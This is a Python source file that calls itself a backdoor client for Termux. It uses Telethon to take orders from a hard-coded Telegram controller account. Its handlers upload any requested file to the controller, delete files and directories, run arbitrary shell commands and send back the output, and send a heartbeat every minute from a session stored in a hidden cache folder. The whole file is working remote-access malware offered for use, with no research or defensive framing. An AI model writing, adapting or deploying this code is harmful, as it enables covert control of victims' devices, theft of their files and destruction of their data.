# client.py
# Backdoor client for Termux.
# Uses Telethon to listen for commands from the controller via Telegram user session.
# Commands: PULL <path>, DELETE <path>, EXEC <cmd>, SLEEP <seconds>
# Sends heartbeat every 60 seconds.

import asyncio
import os
import subprocess
import sys
from telethon import TelegramClient, events

API_ID = 3910389
API_HASH = '86f861352f0ab76a251866059a6adbd6'
SESSION_PATH = os.path.expanduser('~/.config/.cache/client.session')
CONTROLLER_ID = 8167615243
HEARTBEAT_INTERVAL = 60

client = TelegramClient(SESSION_PATH, API_ID, API_HASH)

# Global variable to hold the resolved controller entity.
CONTROLLER_ENTITY = None

async def resolve_controller():
    """Fetch and cache the controller entity using its numeric ID."""
    global CONTROLLER_ENTITY
    try:
        CONTROLLER_ENTITY = await client.get_input_entity(CONTROLLER_ID)
    except Exception:
        try:
            CONTROLLER_ENTITY = await client.get_entity(CONTROLLER_ID)
        except Exception:
            CONTROLLER_ENTITY = None

async def heartbeat():
    while True:
        await asyncio.sleep(HEARTBEAT_INTERVAL)
        try:
            target = CONTROLLER_ENTITY if CONTROLLER_ENTITY else CONTROLLER_ID
            await client.send_message(target, 'HEARTBEAT')
        except Exception:
            pass

@client.on(events.NewMessage(from_users=CONTROLLER_ID))
async def handler(event):
    text = event.raw_text
    target = CONTROLLER_ENTITY if CONTROLLER_ENTITY else CONTROLLER_ID

    if text.startswith('PULL '):
        path = text[5:].strip()
        if os.path.exists(path):
            await client.send_file(target, path)
        else:
            await client.send_message(target, f'ERROR: {path} not found')

    elif text.startswith('DELETE '):
        path = text[7:].strip()
        try:
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
            else:
                os.remove(path)
            await client.send_message(target, f'OK: deleted {path}')
        except Exception as e:
            await client.send_message(target, f'ERROR: {e}')

    elif text.startswith('EXEC '):
        cmd = text[5:].strip()
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            out, _ = proc.communicate()
            await client.send_message(target, f'OUTPUT:\n{out.decode()}')
        except Exception as e:
            await client.send_message(target, f'ERROR: {e}')

    elif text.startswith('SLEEP '):
        seconds = int(text[6:].strip())
        await client.send_message(target, f'Sleeping for {seconds} seconds')
        await client.disconnect()
        await asyncio.sleep(seconds)
        await client.connect()
        await client.send_message(target, 'Awake')

async def main():
    await client.start()
    await resolve_controller()
    asyncio.create_task(heartbeat())
    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
